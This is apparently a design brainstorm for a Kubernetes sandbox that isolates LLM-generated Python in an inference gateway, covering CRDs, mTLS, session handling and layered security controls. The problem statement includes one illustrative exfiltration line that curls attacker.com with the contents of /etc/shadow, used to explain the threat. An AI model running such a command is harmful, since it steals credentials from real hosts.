# Brainstorm: Kubernetes Sandbox Executor

**Status**: Deep design exploration
**Priority**: Highest (core differentiator)
**Dependencies**: Spec 04 (Agentic Loop), Spec 11 (Sandbox Execution), agent-sandbox CRDs
**Package**: `pkg/tools/sandbox`
**Container Image**: `ghcr.io/rhuss/antwort-sandbox`

---

## 1. Problem Statement

### The Security Gap in AI Inference Gateways

Server-side code execution is the most dangerous and most valuable capability an AI inference gateway can offer. Today, every major deployment either disables it entirely or runs it without meaningful isolation.

**OpenClaw's catastrophic failure** (CVE-2026-25253, CVSS 8.8) exposed over 135,000 instances to remote code execution because their `code_interpreter` implementation ran user-submitted Python code in the same process as the gateway itself. The sandbox was off by default. Operators who turned it on got a process-level `subprocess` jail with no kernel isolation, no network restrictions, and no resource limits. An attacker who convinced the LLM to execute `import os; os.system('curl attacker.com/exfil?data=$(cat /etc/shadow)')` could exfiltrate credentials, pivot to internal services, and mine cryptocurrency on the host.

The root cause was architectural: OpenClaw treated code execution as an optional afterthought, not as a first-class security boundary.

**No existing inference gateway provides secure server-side code execution.** The landscape:

| Gateway | Code Execution | Isolation |
|---------|---------------|-----------|
| OpenClaw | In-process subprocess | None (CVE-2026-25253) |
| LiteLLM Proxy | None (passes through to client) | N/A |
| vLLM | None (inference only) | N/A |
| OpenAI API | Proprietary sandbox | Unknown |
| Anthropic API | Proprietary sandbox | Unknown |

Antwort's position: the first open-source inference gateway that provides `code_interpreter` with production-grade isolation, powered by Kubernetes-native sandbox Pods.

### Why This Matters

Without server-side code execution, an agentic loop is fundamentally limited. The LLM can reason and call external APIs, but it cannot:

- Perform data analysis on uploaded files
- Generate visualizations (matplotlib, plotly)
- Run statistical computations
- Transform and clean datasets
- Execute multi-step calculations that would be error-prone in natural language
- Validate its own code before presenting results

The `code_interpreter` tool turns the LLM from a text-processing engine into a computational agent. Getting the isolation right is the prerequisite for making this safe.

---

## 2. How It Maps to the Responses API

### Request Flow

A client sends a standard `CreateResponseRequest` with the `code_interpreter` tool:

```json
{
  "model": "qwen-2.5-coder",
  "input": [
    {
      "type": "message",
      "role": "user",
      "content": [
        {
          "type": "input_text",
          "text": "Calculate the first 20 Fibonacci numbers and plot them."
        }
      ]
    }
  ],
  "tools": [
    {
      "type": "code_interpreter"
    }
  ],
  "stream": true
}
```

The `code_interpreter` tool definition has no `name`, `description`, or `parameters` fields. It is a built-in tool type identified solely by `"type": "code_interpreter"`. The engine recognizes it and registers the sandbox executor for this conversation.

### LLM Generates Code

The LLM responds with a `code_interpreter_call` item containing Python code:

```json
{
  "type": "code_interpreter_call",
  "id": "item_abc123def456",
  "status": "in_progress",
  "code": "import matplotlib.pyplot as plt\n\ndef fibonacci(n):\n    fib = [0, 1]\n    for i in range(2, n):\n        fib.append(fib[-1] + fib[-2])\n    return fib\n\nfibs = fibonacci(20)\nplt.figure(figsize=(10, 6))\nplt.plot(range(20), fibs, 'bo-')\nplt.title('First 20 Fibonacci Numbers')\nplt.xlabel('Index')\nplt.ylabel('Value')\nplt.grid(True)\nplt.savefig('fibonacci.png', dpi=150)\nprint(fibs)"
}
```

Note: this is a different item type from `function_call`. The `code_interpreter_call` carries a `code` field (raw Python), not `name`/`arguments`. The existing `ToolCall` struct in `pkg/tools/executor.go` needs extension to accommodate this, or the sandbox executor receives the raw item and extracts the code itself.

### Server Executes in Sandbox

Antwort's sandbox executor:

1. Claims a sandbox Pod (or reuses one from the current session)
2. Sends the code to the Pod's `/execute` endpoint via mTLS
3. Receives the result: stdout, stderr, exit code, generated files
4. Constructs the `code_interpreter_call` output item

### Response Items

The output item looks like:

```json
{
  "type": "code_interpreter_call",
  "id": "item_abc123def456",
  "status": "completed",
  "code": "import matplotlib.pyplot as plt\n...",
  "results": [
    {
      "type": "text",
      "text": "[0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181]"
    },
    {
      "type": "image",
      "file_id": "file_xyz789",
      "url": "/v1/files/file_xyz789/content"
    }
  ]
}
```

### Streaming Events

For streaming responses, the `code_interpreter_call` emits these SSE events:

```
event: response.code_interpreter_call.in_progress
data: {"type":"response.code_interpreter_call.in_progress","sequence_number":5,"item_id":"item_abc123","output_index":0}

event: response.code_interpreter_call.interpreting
data: {"type":"response.code_interpreter_call.interpreting","sequence_number":6,"item_id":"item_abc123","output_index":0}

event: response.code_interpreter_call.completed
data: {"type":"response.code_interpreter_call.completed","sequence_number":7,"item_id":"item_abc123","output_index":0,"item":{...}}
```

The `interpreting` event fires when the sandbox Pod begins executing. This gives clients a visual indicator that computation is happening (spinner, progress bar).

### SDK Compatibility

Standard OpenAI SDK clients work without modification because:

- The `tools` array uses the same `{"type": "code_interpreter"}` format
- The response items use the same `code_interpreter_call` type
- The streaming events follow the same naming convention
- File references use the same `/v1/files/{id}/content` pattern

---

## 3. Agent-Sandbox CRD Integration

Antwort consumes four CRDs from the [agent-sandbox](https://github.com/kubernetes-sigs/agent-sandbox) project (API group: `agents.x-k8s.io/v1alpha1`).

### SandboxTemplate

Defines the Pod specification for sandbox instances. Antwort ships default templates; operators can customize or add their own.

```yaml
apiVersion: agents.x-k8s.io/v1alpha1
kind: SandboxTemplate
metadata:
  name: antwort-python
  namespace: antwort-sandboxes
spec:
  podTemplate:
    metadata:
      labels:
        app.kubernetes.io/part-of: antwort
        sandbox.antwort.dev/language: python
    spec:
      runtimeClassName: gvisor  # Kernel isolation via gVisor
      serviceAccountName: antwort-sandbox
      securityContext:
        runAsNonRoot: true
        runAsUser: 65534
        fsGroup: 65534
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: sandbox
        image: ghcr.io/rhuss/antwort-sandbox:0.1.0
        ports:
        - name: api
          containerPort: 8080
          protocol: TCP
        resources:
          requests:
            cpu: 250m
            memory: 256Mi
          limits:
            cpu: 500m
            memory: 512Mi
            ephemeral-storage: 1Gi
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop: ["ALL"]
        volumeMounts:
        - name: workspace
          mountPath: /workspace
        - name: tmp
          mountPath: /tmp
        livenessProbe:
          httpGet:
            path: /health
            port: api
          initialDelaySeconds: 2
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /health
            port: api
          initialDelaySeconds: 1
          periodSeconds: 5
      volumes:
      - name: workspace
        emptyDir:
          sizeLimit: 1Gi
      - name: tmp
        emptyDir:
          sizeLimit: 256Mi
```

### SandboxWarmPool

Maintains pre-warmed Pods for sub-second allocation. Without a warm pool, sandbox allocation takes 3-10 seconds (image pull + container start + health check). With a warm pool, allocation takes 50-200ms (just the SandboxClaim binding).

```yaml
apiVersion: agents.x-k8s.io/v1alpha1
kind: SandboxWarmPool
metadata:
  name: antwort-python-pool
  namespace: antwort-sandboxes
spec:
  templateRef:
    name: antwort-python
  replicas: 5              # Pre-warmed instances
  maxReplicas: 20          # Maximum scale-out
  scaleDownDelay: 300s     # Wait before removing idle Pods
```

### SandboxClaim

Antwort creates these to request a sandbox Pod. The agent-sandbox controller binds the claim to an available Pod from the warm pool.

```yaml
apiVersion: agents.x-k8s.io/v1alpha1
kind: SandboxClaim
metadata:
  name: claim-resp-abc123
  namespace: antwort-sandboxes
  labels:
    antwort.dev/conversation-id: resp_abc123def456
    antwort.dev/tenant: tenant-42
spec:
  templateRef:
    name: antwort-python
  ttl: 600s  # Release after 10 minutes of inactivity
```

### Sandbox

The actual running Pod with stable identity. Created by the agent-sandbox controller, not by antwort directly. Antwort reads the Sandbox status to get the Pod IP and connection details.

```yaml
# Created automatically by the agent-sandbox controller when a claim is bound.
apiVersion: agents.x-k8s.io/v1alpha1
kind: Sandbox
metadata:
  name: sandbox-python-j7k2m
  namespace: antwort-sandboxes
spec:
  claimRef:
    name: claim-resp-abc123
  templateRef:
    name: antwort-python
status:
  phase: Running
  podIP: 10.244.3.17
  podName: sandbox-python-j7k2m-0
  conditions:
  - type: Ready
    status: "True"
    lastTransitionTime: "2026-02-22T10:00:05Z"
```

### Lifecycle: Claim, Bind, Execute, Release

```
1. Code interpreter call arrives at antwort engine
        │
2. SandboxExecutor checks session map: existing claim for this conversation?
        │
        ├── YES: Get Pod IP from cached Sandbox status
        │         │
        │         └── Pod still healthy? (readiness check)
        │              ├── YES: Skip to step 6
        │              └── NO: Release old claim, proceed to step 3
        │
        └── NO: Continue to step 3
        │
3. Create SandboxClaim referencing the "antwort-python" template
        │
4. Watch SandboxClaim status for phase=Bound (timeout: 30s)
        │
5. Read bound Sandbox resource to get Pod IP
        │
6. Establish mTLS connection to Pod IP:8080
        │
7. POST /execute with code payload
        │
8. Receive result (stdout, stderr, files, exit code)
        │
9. Map result to code_interpreter_call output item
        │
10. Store conversation -> SandboxClaim mapping in session map
        │
11. On conversation end or idle timeout: delete SandboxClaim
    (agent-sandbox controller handles Pod cleanup)
```

### Warm Pool Sizing Strategy

Three approaches, not mutually exclusive:

**Global pool**: A single `SandboxWarmPool` shared across all tenants. Simple to configure. Risk: one tenant can exhaust the pool.

```yaml
# Good for single-tenant or low-traffic deployments
spec:
  replicas: 5
  maxReplicas: 20
```

**Per-tenant pools**: Each tenant gets a dedicated `SandboxWarmPool` in their Namespace. Isolation is strong, but operator overhead increases.

```yaml
# Created per tenant by an admission controller or operator
metadata:
  name: pool-tenant-42
  namespace: tenant-42-sandboxes
spec:
  replicas: 2
  maxReplicas: 10
```

**Tiered pools**: A small global pool for burst, plus per-tenant quotas enforced via ResourceQuotas on the sandbox Namespace.

Recommendation for the initial implementation: global pool with a configurable cap. Per-tenant pools are a future enhancement driven by operator demand.

### Auto-scaling Based on Demand

The `SandboxWarmPool` controller in agent-sandbox should support scaling based on pending claims. When pending claims exceed available Pods, the pool scales up (to `maxReplicas`). When idle Pods exceed demand for `scaleDownDelay`, it scales down (to `replicas`).

Antwort does not manage scaling. It creates claims and lets the controller handle capacity.

---

## 4. The Sandbox Container Image

The sandbox container image is an antwort project deliverable. It contains everything needed to execute Python code securely and return structured results.

### Base Image Stack

```dockerfile
FROM python:3.12-slim AS base

# Install uv package manager
COPY --from=ghcr.io/astral-sh/uv:0.6 /uv /usr/local/bin/uv

# Create non-root user
RUN groupadd -r sandbox && useradd -r -g sandbox -d /workspace -s /bin/false sandbox

# Pre-install common data science packages into a system venv
# so the warm pool Pods are immediately useful
RUN uv venv /opt/base-env && \
    . /opt/base-env/bin/activate && \
    uv pip install \
      numpy==2.2.0 \
      pandas==2.2.3 \
      matplotlib==3.10.0 \
      scipy==1.15.0 \
      scikit-learn==1.6.1

# Copy the execution server binary
COPY sandbox-server /usr/local/bin/sandbox-server

USER sandbox
WORKDIR /workspace
EXPOSE 8080

ENTRYPOINT ["sandbox-server"]
```

### Execution Server

The execution server is a lightweight HTTP server (written in Go for consistency with antwort, compiled as a static binary) that accepts code and returns structured results.

**Why Go, not Python?** The execution server needs to:
- Start instantly (no Python import overhead)
- Manage subprocesses reliably (process groups, signals, timeouts)
- Serve HTTP with mTLS (Go's crypto/tls + SPIFFE libraries)
- Stay under 10MB binary size
- Not interfere with the user's Python environment

A Python execution server would add import time, complicate the virtual environment story, and introduce a dependency conflict surface.

### REST API Contract

Any container image that implements these endpoints can be used as a sandbox. This is the interface, not the language.

#### `POST /execute`

Execute a code snippet.

Request:
```json
{
  "code": "import numpy as np\nprint(np.array([1,2,3]).mean())",
  "timeout_seconds": 30,
  "working_dir": "/workspace"
}
```

Response (success):
```json
{
  "status": "success",
  "stdout": "2.0\n",
  "stderr": "",
  "exit_code": 0,
  "duration_ms": 142,
  "files": [
    {
      "id": "f_a1b2c3",
      "name": "output.png",
      "path": "/workspace/output.png",
      "size_bytes": 45231,
      "mime_type": "image/png"
    }
  ]
}
```

Response (error):
```json
{
  "status": "error",
  "stdout": "",
  "stderr": "Traceback (most recent call last):\n  File \"/tmp/exec_abc.py\", line 1\n    import numpyy\nModuleNotFoundError: No module named 'numpyy'",
  "exit_code": 1,
  "duration_ms": 87,
  "files": []
}
```

Response (timeout):
```json
{
  "status": "timeout",
  "stdout": "Processing batch 1...\nProcessing batch 2...\n",
  "stderr": "",
  "exit_code": -1,
  "duration_ms": 30000,
  "files": []
}
```

#### `GET /files`

List all files in the workspace directory.

Response:
```json
{
  "files": [
    {
      "id": "f_a1b2c3",
      "name": "output.png",
      "path": "/workspace/output.png",
      "size_bytes": 45231,
      "mime_type": "image/png"
    },
    {
      "id": "f_d4e5f6",
      "name": "results.csv",
      "path": "/workspace/results.csv",
      "size_bytes": 1024,
      "mime_type": "text/csv"
    }
  ]
}
```

#### `GET /files/{id}`

Download a specific file. Returns the raw file content with appropriate `Content-Type` header.

```
GET /files/f_a1b2c3
Content-Type: image/png
Content-Length: 45231

<binary PNG data>
```

#### `POST /install`

Install Python packages into the sandbox environment.

Request:
```json
{
  "packages": ["plotly>=5.0", "seaborn"],
  "index_url": "https://pypi.org/simple/"
}
```

Response:
```json
{
  "status": "success",
  "installed": ["plotly==5.24.1", "seaborn==0.13.2"],
  "duration_ms": 4521
}
```

#### `GET /health`

Health check and status reporting.

Response:
```json
{
  "status": "healthy",
  "uptime_seconds": 3600,
  "executions_total": 42,
  "workspace_usage_bytes": 5242880,
  "workspace_limit_bytes": 1073741824,
  "python_version": "3.12.8",
  "uv_version": "0.6.2",
  "pre_installed_packages": ["numpy==2.2.0", "pandas==2.2.3", "matplotlib==3.10.0"]
}
```

### How the Execution Server Works Internally

```
1. Receive POST /execute with code payload
       │
2. Generate unique execution ID (e.g., "exec_k9m2n4")
       │
3. Write code to /tmp/exec_k9m2n4.py
       │
4. Scan /workspace for existing files (pre-execution snapshot)
       │
5. Start subprocess:
   python3 /tmp/exec_k9m2n4.py
   - Working directory: /workspace
   - Process group: new (for clean kill)
   - Stdout/stderr: captured via pipes
   - Environment: inherit base + user packages
       │
6. Wait for completion with timeout:
   - select { case result := <-done: ... case <-timer: kill process group }
       │
7. Scan /workspace for new/modified files (post-execution snapshot)
       │
8. Diff file lists to identify generated files
       │
9. Assign file IDs to new files
       │
10. Build structured response:
    - stdout (string, capped at 100KB)
    - stderr (string, capped at 100KB)
    - exit_code (int)
    - duration_ms (int)
    - files (list of generated file metadata)
       │
11. Clean up /tmp/exec_k9m2n4.py
       │
12. Return response
```

### BYO Image Support

Any container image that implements the five REST endpoints works as a sandbox. Operators can bring their own images for:

- Different Python versions (3.10, 3.11, 3.13)
- Pre-installed domain-specific packages (bioinformatics, finance, NLP)
- Alternative languages (Node.js, Go, Rust) with the same REST contract
- Custom security hardening (FIPS-compliant images, air-gapped environments)

To register a custom image, create a `SandboxTemplate` referencing it:

```yaml
apiVersion: agents.x-k8s.io/v1alpha1
kind: SandboxTemplate
metadata:
  name: antwort-python-finance
spec:
  podTemplate:
    spec:
      containers:
      - name: sandbox
        image: registry.internal.corp/sandbox-finance:2.1.0
        # ... same port, probe, security context structure
```

### Image Registry and Versioning

- Default image: `ghcr.io/rhuss/antwort-sandbox:<version>`
- Version tags match antwort releases (e.g., `0.1.0`, `0.2.0`)
- `latest` tag always points to the most recent stable release
- SHA-pinned references in the shipped `SandboxTemplate` manifests for reproducibility
- Multi-arch builds: `linux/amd64` and `linux/arm64`

---

## 5. Communication: Antwort to Sandbox Pod

### mTLS with SPIFFE/SPIRE Workload Identities

All communication between antwort and sandbox Pods uses mutual TLS. Neither side trusts the other based on network position alone. Identity is cryptographically verified.

### SPIFFE Identity Model

```
Antwort process:
  SPIFFE ID: spiffe://cluster.local/ns/antwort/sa/antwort

Sandbox Pod (Python, instance j7k2m):
  SPIFFE ID: spiffe://cluster.local/ns/antwort-sandboxes/sa/antwort-sandbox
```

Both identities are issued by the SPIRE server running in the cluster. The SPIRE agent on each node provides SVIDs (SPIFFE Verifiable Identity Documents) to workloads via the Workload API (a Unix domain socket).

### Why Not Shared Secrets or API Keys?

- Shared secrets are static. If leaked, all sandbox Pods are compromised until rotation.
- API keys require a distribution mechanism (Secrets, vault). More infrastructure to manage.
- SPIFFE identities are ephemeral, automatically rotated, and tied to workload attestation. A Pod gets its identity from the kernel (PID, cgroup) through the SPIRE agent. No secrets to distribute.

### Connection Flow

```
1. Antwort receives code_interpreter_call
       │
2. Resolve sandbox Pod IP from SandboxClaim/Sandbox status
       │
3. Load SVID from local SPIRE agent (via Workload API socket)
       │
4. Establish TLS connection to Pod IP:8080
   - Client certificate: antwort's SVID
   - Server certificate: sandbox Pod's SVID
   - Both sides verify: trust domain matches, SPIFFE ID matches expected pattern
       │
5. If TLS handshake fails:
   - Log error with both SPIFFE IDs
   - Return ToolResult with is_error=true
   - Do NOT retry (identity issues are not transient)
       │
6. Send HTTP request over established mTLS connection
       │
7. Receive response
       │
8. Connection kept alive for subsequent calls in the same session
```

### Timeout Handling

Two separate timeouts, each serving a different purpose:

**Connection timeout** (default: 10s): How long to wait for TCP connection + TLS handshake. If this fails, the Pod may be unreachable (not yet ready, network issue). Connection failures CAN be retried because they are idempotent.

**Execution timeout** (default: 30s, max: 300s, configurable per-request): How long to wait for the code to finish executing. Passed to the sandbox server in the `/execute` request body. The sandbox server enforces this by killing the subprocess after the timeout. If the HTTP response is not received within execution timeout + 5s grace period, antwort closes the connection.

### Retry Semantics

**Code execution is NEVER retried.** Code execution is non-idempotent. Running `random.randint(1, 100)` twice gives different results. Running `send_email()` twice sends two emails. If execution times out or fails, the error is returned to the LLM, which can decide whether to retry with modified code.

**Connection establishment CAN be retried.** If the TLS handshake fails due to a transient network issue, antwort retries up to 3 times with exponential backoff (100ms, 200ms, 400ms). If all retries fail, the error is returned to the LLM.

---

## 6. Session Model

### Default: Session-Scoped Sandbox

A single sandbox Pod persists across all `code_interpreter` calls within a conversation. This is the most natural model for data analysis workflows.

```
Conversation resp_abc123:
  ├── Turn 1: "Load the CSV and show the first 5 rows"
  │   └── code_interpreter_call: pd.read_csv('data.csv').head()
  │       └── Executes in sandbox Pod sandbox-python-j7k2m
  │
  ├── Turn 2: "Now plot the price column"
  │   └── code_interpreter_call: plt.plot(df['price']); plt.savefig('plot.png')
  │       └── Executes in SAME Pod sandbox-python-j7k2m
  │       └── df is still in memory from turn 1
  │
  └── Turn 3: "Export the cleaned data"
      └── code_interpreter_call: df.to_csv('cleaned.csv')
          └── Executes in SAME Pod sandbox-python-j7k2m
```

State that persists across calls within a session:
- Python variables in memory (if using a persistent kernel, see Open Questions)
- Files written to `/workspace`
- Packages installed via `POST /install`
- Working directory state

### Session Creation and Tracking

```go
// SessionManager tracks conversation -> SandboxClaim mappings.
type SessionManager struct {
    mu       sync.RWMutex
    sessions map[string]*SandboxSession // conversation ID -> session
}

type SandboxSession struct {
    ConversationID string
    TenantID       string
    ClaimName      string        // SandboxClaim resource name
    PodIP          string        // Resolved from Sandbox status
    LastActivity   time.Time
    IdleTimeout    time.Duration // Default: 10 minutes
}
```

The first `code_interpreter_call` in a conversation creates a `SandboxClaim` and stores the session mapping. Subsequent calls look up the existing session, verify Pod health, and reuse it.

### Session Termination

A session ends (and the `SandboxClaim` is released) when:

1. **Conversation completes**: The response finishes with status `completed` and no pending tool calls
2. **Idle timeout**: No `code_interpreter_call` for the configured idle duration (default: 10 minutes)
3. **Explicit release**: The client deletes the response (future: explicit session close API)
4. **TTL expiry**: The `SandboxClaim`'s `ttl` field triggers automatic release by the agent-sandbox controller

When a session ends, antwort deletes the `SandboxClaim` resource. The agent-sandbox controller handles Pod cleanup (return to pool or terminate).

### Alternative: Ephemeral (Pod-Per-Execution)

For untrusted code or multi-tenant scenarios where state leakage between calls is a concern:

- Each `code_interpreter_call` gets a fresh sandbox Pod
- No state carries over between calls
- Higher latency (Pod allocation per call)
- Stronger isolation (no residual data from previous executions)

Configured via the `SandboxTemplate` or per-request via an extension field:

```json
{
  "tools": [{"type": "code_interpreter"}],
  "extensions": {
    "antwort:sandbox": {
      "session_mode": "ephemeral"
    }
  }
}
```

### Alternative: Persistent (Pod Outlives Conversation)

For long-running workspaces where a user wants to pick up where they left off across multiple conversations:

- Pod persists beyond conversation end
- User can reconnect via a workspace ID
- Requires persistent storage (PVC instead of emptyDir)
- Use case: interactive data exploration, notebook-like workflows

This is a future enhancement. The initial implementation supports session-scoped and ephemeral modes only.

### Idle Timeout Behavior

When the idle timeout fires:

1. Antwort marks the session as expired in its session map
2. Antwort deletes the `SandboxClaim`
3. The agent-sandbox controller decides what to do with the Pod:
   - If `SandboxWarmPool` has room, return the Pod to the pool (after wiping `/workspace`)
   - If the pool is full, terminate the Pod

The Pod is not "paused" in the container runtime sense. Pausing and resuming containers adds complexity and is not reliably supported across all runtimes. Instead, the Pod is either returned to the warm pool (recycled) or terminated.

---

## 7. Security Model (8 Layers)

Each layer addresses a specific threat vector. All eight layers are active simultaneously.

### Layer 0: Namespace Isolation

**Threat**: Cross-tenant data access. Tenant A's sandbox reads Tenant B's files or secrets.

**Mitigation**: Sandbox Pods run in a dedicated Namespace (e.g., `antwort-sandboxes`), separate from antwort's own Namespace and from any tenant application Namespaces. RBAC policies prevent sandbox ServiceAccounts from accessing any Kubernetes API resources.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: sandbox-deny-all
  namespace: antwort-sandboxes
rules: []  # No permissions at all
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: sandbox-deny-all
  namespace: antwort-sandboxes
subjects:
- kind: ServiceAccount
  name: antwort-sandbox
  namespace: antwort-sandboxes
roleRef:
  kind: Role
  name: sandbox-deny-all
  apiGroup: rbac.authorization.k8s.io
```

The sandbox Pod has zero access to the Kubernetes API. It cannot list Pods, read Secrets, or discover Services. Its ServiceAccount token is not mounted (`automountServiceAccountToken: false`).

### Layer 1: Kernel Isolation (gVisor)

**Threat**: Container escape. Malicious code exploits a kernel vulnerability to break out of the container.

**Mitigation**: Sandbox Pods use the `gvisor` RuntimeClass. gVisor intercepts all syscalls in userspace, providing a secondary kernel boundary. Even if the Python code triggers a kernel exploit, it hits gVisor's userspace kernel, not the host kernel.

```yaml
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc
```

The `SandboxTemplate` specifies `runtimeClassName: gvisor`. If gVisor is not available on the cluster, the template validation fails at creation time (not at runtime).

**Fallback**: For clusters without gVisor, operators can omit the RuntimeClass and accept reduced isolation. Antwort should log a warning at startup if the configured `SandboxTemplate` does not use a sandboxed runtime.

### Layer 2: Network Isolation

**Threat**: Data exfiltration. Malicious code phones home, accesses internal services, or scans the network.

**Mitigation**: A NetworkPolicy with default deny-all egress. Specific egress rules are added only for required destinations (Python package indices).

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: sandbox-network-policy
  namespace: antwort-sandboxes
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/part-of: antwort
      sandbox.antwort.dev/language: python
  policyTypes:
  - Egress
  - Ingress
  ingress:
  # Only accept connections from antwort Pods
  - from:
    - namespaceSelector:
        matchLabels:
          app.kubernetes.io/name: antwort
    ports:
    - port: 8080
      protocol: TCP
  egress:
  # DNS resolution (required for package installation)
  - to:
    - namespaceSelector: {}
    ports:
    - port: 53
      protocol: UDP
    - port: 53
      protocol: TCP
  # PyPI (for uv pip install)
  - to:
    - ipBlock:
        cidr: 151.101.0.0/16  # Fastly CDN (PyPI)
    ports:
    - port: 443
      protocol: TCP
```

**Configurable allowlist**: Operators can add egress rules for internal package registries, data sources, or APIs that sandbox code needs to access. The default is deny-all except DNS and PyPI.

### Layer 3: Resource Limits

**Threat**: Resource exhaustion. Malicious code runs a fork bomb, allocates all memory, or fills the disk.

**Mitigation**: Hard resource limits enforced by the container runtime.

| Resource | Default Limit | Configurable Range |
|----------|--------------|-------------------|
| CPU | 500m | 100m to 4000m |
| Memory | 512Mi | 128Mi to 8Gi |
| Ephemeral storage | 1Gi | 256Mi to 10Gi |
| PIDs | 256 (via cgroup) | 64 to 1024 |

These are set in the `SandboxTemplate` Pod spec. The agent-sandbox controller enforces them via the container runtime.

When a sandbox Pod exceeds its memory limit, the OOM killer terminates the process. The execution server detects this (the subprocess exit code is 137) and returns an error result:

```json
{
  "status": "error",
  "stdout": "",
  "stderr": "Process killed: out of memory (limit: 512Mi)",
  "exit_code": 137,
  "duration_ms": 1523
}
```

### Layer 4: Process Isolation

**Threat**: Privilege escalation. Malicious code exploits setuid binaries, mounts filesystems, or loads kernel modules.

**Mitigation**: Strict SecurityContext applied to the sandbox container.

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 65534          # nobody
  runAsGroup: 65534         # nogroup
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
  seccompProfile:
    type: RuntimeDefault
```

The sandbox runs as the `nobody` user. The root filesystem is read-only (writable paths: `/workspace` via emptyDir, `/tmp` via emptyDir). All Linux capabilities are dropped. The seccomp profile blocks dangerous syscalls.

### Layer 5: Image Control

**Threat**: Arbitrary image execution. An attacker injects a malicious image reference into a SandboxTemplate.

**Mitigation**: Only images referenced by registered `SandboxTemplate` resources are used. Antwort does not accept image references from client requests. The operator controls which images are available.

Additional hardening:
- Use image digest references (`@sha256:...`) instead of tags in production
- Configure `ImagePolicyWebhook` or a policy engine (Kyverno, OPA Gatekeeper) to restrict allowed registries
- Sign images with cosign and verify signatures at admission time

### Layer 6: Execution Timeout

**Threat**: Infinite loops, crypto mining, slow resource exhaustion.

**Mitigation**: The execution server enforces a hard timeout on every subprocess.

```go
// In the execution server
ctx, cancel := context.WithTimeout(ctx, time.Duration(req.TimeoutSeconds)*time.Second)
defer cancel()

cmd := exec.CommandContext(ctx, "python3", scriptPath)
cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true} // New process group

err := cmd.Run()
if ctx.Err() == context.DeadlineExceeded {
    // Kill the entire process group (not just the parent)
    syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
    return TimeoutResult(partialStdout, elapsed)
}
```

Timeout values:
- Default: 30 seconds
- Minimum: 1 second
- Maximum: 300 seconds (5 minutes)
- Configurable per-request in the `CreateResponseRequest` extensions

### Layer 7: Audit Logging

**Threat**: Undetected abuse. Malicious code executes without leaving a trace.

**Mitigation**: Every execution is logged with structured fields via slog.

```go
slog.Info("sandbox execution completed",
    "tenant_id", session.TenantID,
    "conversation_id", session.ConversationID,
    "sandbox_pod", session.PodIP,
    "code_hash", sha256Hex(code),  // Hash, not the code itself (privacy)
    "code_length", len(code),
    "exit_code", result.ExitCode,
    "duration_ms", result.DurationMs,
    "stdout_length", len(result.Stdout),
    "stderr_length", len(result.Stderr),
    "files_generated", len(result.Files),
    "total_file_size", totalFileSize(result.Files),
    "status", result.Status,
)
```

The code itself is NOT logged by default (privacy, PII risk). Only a SHA-256 hash of the code is logged for correlation. An operator can enable full code logging for debugging by setting a log level flag.

Audit events include:
- Execution start/completion
- Package installation requests
- File access (reads and writes)
- Pod allocation and release
- Session creation and termination
- Security violations (timeout kills, OOM kills, network policy blocks)

---

## 8. Integration with the Agentic Loop

### How the Sandbox Executor Fits

The sandbox executor implements the `tools.ToolExecutor` interface (defined in `pkg/tools/executor.go`) and registers with the engine like the MCP executor.

```go
package sandbox

import (
    "context"
    "github.com/rhuss/antwort/pkg/tools"
)

// SandboxExecutor implements tools.ToolExecutor for code_interpreter calls.
type SandboxExecutor struct {
    k8sClient      kubernetes.Interface   // Kubernetes API client
    sessions       *SessionManager        // Conversation -> Pod mapping
    config         SandboxConfig          // Template refs, timeouts, etc.
    spiffeSource   SpiffeX509Source       // SVID provider for mTLS
}

var _ tools.ToolExecutor = (*SandboxExecutor)(nil)

func (e *SandboxExecutor) Kind() tools.ToolKind {
    return tools.ToolKindSandbox
}

func (e *SandboxExecutor) CanExecute(toolName string) bool {
    return toolName == "code_interpreter"
}

func (e *SandboxExecutor) Execute(ctx context.Context, call tools.ToolCall) (*tools.ToolResult, error) {
    // 1. Extract conversation ID from context
    conversationID := contextutil.ConversationID(ctx)

    // 2. Get or create sandbox session
    session, err := e.sessions.GetOrCreate(ctx, conversationID, e.config)
    if err != nil {
        return &tools.ToolResult{
            CallID:  call.ID,
            Output:  "Failed to allocate sandbox: " + err.Error(),
            IsError: true,
        }, nil
    }

    // 3. Extract code from the tool call
    // For code_interpreter, Arguments contains the code as JSON
    code, err := extractCode(call.Arguments)
    if err != nil {
        return &tools.ToolResult{
            CallID:  call.ID,
            Output:  "Invalid code_interpreter arguments: " + err.Error(),
            IsError: true,
        }, nil
    }

    // 4. Execute via mTLS connection to sandbox Pod
    result, err := e.executeInSandbox(ctx, session, code)
    if err != nil {
        return &tools.ToolResult{
            CallID:  call.ID,
            Output:  "Sandbox execution failed: " + err.Error(),
            IsError: true,
        }, nil
    }

    // 5. Format result for the LLM
    output := formatResult(result)

    return &tools.ToolResult{
        CallID:  call.ID,
        Output:  output,
        IsError: result.ExitCode != 0,
    }, nil
}
```

### New Item Types

The `code_interpreter_call` is a distinct item type from `function_call`. The `pkg/api/types.go` file needs new constants and data structures:

```go
const (
    ItemTypeCodeInterpreterCall ItemType = "code_interpreter_call"
)

type CodeInterpreterCallData struct {
    Code    string                    `json:"code"`
    Results []CodeInterpreterResult   `json:"results,omitempty"`
}

type CodeInterpreterResult struct {
    Type   string `json:"type"`   // "text" or "image"
    Text   string `json:"text,omitempty"`
    FileID string `json:"file_id,omitempty"`
    URL    string `json:"url,omitempty"`
}
```

### How the Agentic Loop Handles code_interpreter_call

The existing agentic loop in `pkg/engine/loop.go` dispatches tool calls by name. For `code_interpreter_call` items, the flow differs slightly from `function_call` items:

1. The provider adapter (vLLM, LiteLLM) translates the LLM's code generation into a `code_interpreter_call` item
2. `extractToolCalls()` in `loop.go` recognizes `code_interpreter_call` items and creates a `ToolCall` with `Name: "code_interpreter"` and `Arguments` containing the code
